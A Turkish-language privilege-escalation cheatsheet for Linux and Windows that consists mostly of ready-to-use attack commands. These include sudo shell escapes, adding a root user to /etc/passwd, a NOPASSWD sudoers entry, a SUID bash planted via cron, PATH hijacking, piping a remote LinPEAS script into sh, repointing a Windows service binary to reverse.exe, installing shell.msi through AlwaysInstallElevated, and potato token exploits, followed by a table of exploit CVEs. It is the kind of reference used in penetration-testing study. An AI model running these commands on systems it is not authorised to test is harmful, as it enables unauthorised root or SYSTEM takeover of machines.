# Yetki Yükseltme (Privilege Escalation) Cheatsheet

## Linux Yetki Yükseltme

### Keşif ve Sistem Bilgisi

```bash
# Sistem bilgisi
id && whoami
uname -a
cat /etc/os-release
hostname
cat /proc/version

# Ağ bilgisi
ifconfig || ip a
netstat -tulnp || ss -tulnp
cat /etc/hosts

# Çalışan süreçler
ps aux
ps -ef
top

# Kurulu yazılımlar
dpkg -l           # Debian/Ubuntu
rpm -qa           # Red Hat/CentOS
```

### Kullanıcı ve Grup Bilgisi

```bash
cat /etc/passwd
cat /etc/shadow          # root gerekir
cat /etc/group
sudo -l                  # Sudo yetkilerini listele
id
groups
last                     # Son girişler
w                        # Aktif kullanıcılar
```

### SUID/SGID Dosyaları

```bash
# SUID bit ayarlı dosyaları bul
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# SGID bit ayarlı dosyaları bul
find / -perm -2000 -type f 2>/dev/null

# Her ikisi
find / -perm /6000 -type f 2>/dev/null
```

### Sudo Yetki İstismarı

```bash
sudo -l                            # İzin verilen komutları listele
sudo -u <kullanici> /bin/bash      # Başka kullanıcı olarak bash

# GTFOBins örnekleri (https://gtfobins.github.io)
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd              # !bash
sudo man man                       # !bash
```

### Yazılabilir Dosyalar ve Dizinler

```bash
# Herkesin yazabildiği dosyalar
find / -writable -type f 2>/dev/null | grep -v proc

# /etc/passwd yazılabilirse
openssl passwd -1 -salt xyz yenisifre
# hash'i /etc/passwd'a ekle: yenikullanici:hash:0:0:root:/root:/bin/bash

# /etc/sudoers yazılabilirse
echo "kullanici ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

### Cron Job İstismarı

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
crontab -l -u root

# Tüm zamanlanmış görevleri görüntüle
cat /var/spool/cron/crontabs/*

# Cron tarafından çalıştırılan bir script yazılabilirse
echo "chmod +s /bin/bash" >> /path/to/cron_script.sh
# Sonra: /bin/bash -p
```

### Zayıf PATH Kullanımı

```bash
# Göreceli yol kullanan SUID/sudo binary bul
strings /path/to/suid_binary | grep -i "^[a-z]"  # Tam yol yok demek

# PATH enjeksiyonu
export PATH=/tmp:$PATH
echo '#!/bin/bash\nbash -i' > /tmp/servis_adi
chmod +x /tmp/servis_adi
```

### Kernel Exploitleri

```bash
uname -r                  # Kernel versiyonu
searchsploit linux kernel <versiyon>
# Önce dirty cow, dirtypipe, pkexec (CVE-2021-4034) gibi ünlü exploitleri dene
```

### Araç: LinPEAS / LinEnum

```bash
# LinPEAS indirip çalıştır
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh
```

---

## Windows Yetki Yükseltme

### Sistem Bilgisi

```cmd
whoami /all
systeminfo
hostname
net user
net localgroup administrators
ipconfig /all
netstat -ano
tasklist /svc
```

### Kayıt Defteri Parolaları

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```

### Unquoted Service Path

```cmd
# Alıntılanmamış yol içeren servisleri bul
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# PowerShell ile
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -notmatch 'C:\\Windows'} | Select-Object Name,PathName
```

### Zayıf Servis İzinleri

```cmd
# accesschk.exe (Sysinternals)
accesschk.exe -ucqv <servis_adi>
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *

# Servis binary yolunu değiştir
sc config <servis_adi> binpath= "C:\Users\kullanici\reverse.exe"
sc start <servis_adi>
```

### AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Her ikisi 1 ise: msiexec /quiet /qn /i shell.msi
```

### Token İstismarı

```cmd
# Whoami ile ayrıcalıkları kontrol et
whoami /priv

# SeImpersonatePrivilege veya SeAssignPrimaryTokenPrivilege varsa:
# JuicyPotato, PrintSpoofer, RoguePotato gibi araçlar kullanılabilir

.\PrintSpoofer.exe -i -c cmd
.\JuicyPotato.exe -l 1337 -c "{CLSID}" -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

### Araç: WinPEAS

```cmd
# WinPEAS indir ve çalıştır
.\winPEASx64.exe

# PowerShell ile
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### Yaygın Exploit Referansı

| CVE | İsim | Hedef |
|---|---|---|
| CVE-2021-4034 | PwnKit | Linux pkexec |
| CVE-2022-0847 | Dirty Pipe | Linux Kernel 5.8-5.16 |
| CVE-2016-5195 | Dirty COW | Linux Kernel < 4.8.3 |
| CVE-2020-1472 | Zerologon | Windows DC |
| CVE-2021-1675 | PrintNightmare | Windows Spooler |
| MS16-032 | Secondary Logon | Windows 7-10 |
